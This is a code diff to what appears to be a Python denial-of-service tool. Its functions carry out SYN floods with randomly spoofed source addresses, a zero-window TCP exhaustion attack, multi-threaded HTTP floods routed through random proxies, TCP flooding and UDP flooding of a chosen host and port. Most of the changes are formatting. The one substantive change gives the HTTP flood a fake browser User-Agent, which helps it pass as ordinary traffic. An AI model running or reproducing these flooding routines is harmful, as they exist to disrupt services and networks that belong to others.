@@ -6,6 +6,7 @@ import socket
 from socket import *
 from time import sleep
 from urllib import request
+from urllib.request import Request
 
 from scapy.layers.inet import TCP, IP
 from scapy.sendrecv import send, sr1
@@ -56,7 +57,7 @@ def isSnull(string: str):
 def synAttack(urip, sourceport, tgtip, tgtport, thread):
     import impacket.ImpactPacket
     import warnings
-    noPolIp = str(tgtip).replace('https://','').replace('http://','')
+    noPolIp = str(tgtip).replace('https://', '').replace('http://', '')
     tgtip = gethostbyname(noPolIp)
     warnings.filterwarnings("ignore")
     colormsg("Start Thread", 'yellow')
@@ -91,31 +92,41 @@ def synAttack(urip, sourceport, tgtip, tgtport, thread):
 
     for i in range(1, thread + 1):
         _thread.start_new_thread(get, (urip, sourceport, tgtip, tgtport,))
+
+
 def randomSynIp():
     return ".".join(map(str, (random.randint(0, 255) for i in range(4))))
+
+
 def randomSynPort():
     return random.randint(1000, 55500)
 
+
 def sockFullAttack(tgtip, tgtport, thread):
     colormsg("Start Thread", 'yellow')
+
     def get(tgtip, tgtport):
         while True:
             try:
                 tgtip = gethostbyname(str(tgtip).replace('https://', '').replace('http://', ''))
-                xport = random.randint(0 ,65535)
-                response = sr1(IP(dst=tgtip)/TCP(sport=xport,dport=tgtport,flags="S"),timeout=1,verbose=0)
-                send(IP(dst=tgtip) / TCP(dport=tgtport,sport=xport,window=0,flags="A",ack=(response[TCP].seq +1))/'\x00\x00',verbose=0)
+                xport = random.randint(0, 65535)
+                response = sr1(IP(dst=tgtip) / TCP(sport=xport, dport=tgtport, flags="S"), timeout=1, verbose=0)
+                send(IP(dst=tgtip) / TCP(dport=tgtport, sport=xport, window=0, flags="A",
+                                         ack=(response[TCP].seq + 1)) / '\x00\x00', verbose=0)
                 colormsg(f"SUCCESS", 'green')
             except Exception as e:
                 colormsg(f"FAILED.{e}", 'red')
             finally:
                 sleep(0)
-    for i in range(1, thread+1):
+
+    for i in range(1, thread + 1):
         _thread.start_new_thread(get, (tgtip, tgtport,))
+
+
 def synAttackBetter(srcip, tgtip, thread):
     def get(srcip, tgtip):
 
-        tgtip = gethostbyname(str(tgtip).replace('https://','').replace('http://',''))
+        tgtip = gethostbyname(str(tgtip).replace('https://', '').replace('http://', ''))
         colormsg(f'Start thread', 'yellow')
         while True:
             try:
@@ -131,8 +142,10 @@ def synAttackBetter(srcip, tgtip, thread):
             finally:
                 sleep(0)
             colormsg(f'SUCCESS', 'green')
-    for i in range(1, thread+1):
+
+    for i in range(1, thread + 1):
         _thread.start_new_thread(get, (srcip, tgtip))
+
 
 def getKeyValue(key, conf: dict):
     f = open("./CONF/HTS.conf", 'r', encoding='utf-8')
@@ -192,17 +205,22 @@ $('#adarea').slideUp(500);
 
 
 def sendPacketAttack(host: list, thread: int, failnum: int = 15):
-    def get(page):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
+    }
+
+    def get(page, headers: dict):
         colormsg("Start thread", 'yellow')
         fn = 0
         if failnum != -1:
             fn = 0
         else:
             fn = -191981011451466
+        req = Request(str(page), headers=headers)
         if not os.path.exists('./proxies.txt'):
             while fn <= failnum:
                 try:
-                    request.urlopen(page).read()
+                    request.urlopen(req).read()
                     colormsg("Success", "green")
                 except Exception as e:
                     colormsg(f"Failed.{e}", 'red')
@@ -213,7 +231,7 @@ def sendPacketAttack(host: list, thread: int, failnum: int = 15):
                     proxy_handler = request.ProxyHandler({'http': f'http://{random.choice(makeProxiesList())}'})
                     opener = request.build_opener(proxy_handler)
 
-                    opener.open(str(page)).read()
+                    opener.open(req).read()
                     colormsg("Success", 'green')
                 except Exception as e:
                     colormsg(f"Failed.{e}", 'red')
@@ -223,7 +241,7 @@ def sendPacketAttack(host: list, thread: int, failnum: int = 15):
 
     for a in host:
         for i in range(1, thread + 1):
-            _thread.start_new_thread(get, (a,))
+            _thread.start_new_thread(get, (a, headers))
     sleep(0)
 
 
@@ -238,7 +256,7 @@ def tcpAttack(host: tuple, thread: int, num: int = 50):
             try:
                 s.connect((host, port))
                 s.send((
-                        ""* num).encode(
+                    "" * num).encode(
                     'utf-8'))
                 colormsg("Success", 'green')
 
@@ -250,6 +268,8 @@ def tcpAttack(host: tuple, thread: int, num: int = 50):
 
     for i in range(1, thread + 1):
         _thread.start_new_thread(sP, (host[0], host[1]))
+
+
 def udpAttack(ip, port, thread: int):
     colormsg("Thread Start!", "yellow")
 
@@ -258,7 +278,7 @@ def udpAttack(ip, port, thread: int):
             s = socket(AF_INET, SOCK_DGRAM)
 
             try:
-                s.sendto(("AAa"*10240).encode('Utf-8'),(ip, int(port)))
+                s.sendto(("AAa" * 10240).encode('Utf-8'), (ip, int(port)))
                 colormsg("Success", 'green')
 
             except Exception as e:
@@ -267,6 +287,7 @@ def udpAttack(ip, port, thread: int):
 
     for i in range(1, thread + 1):
         _thread.start_new_thread(get, (ip, port))
+
 
 def makeProxiesList():
     global plist
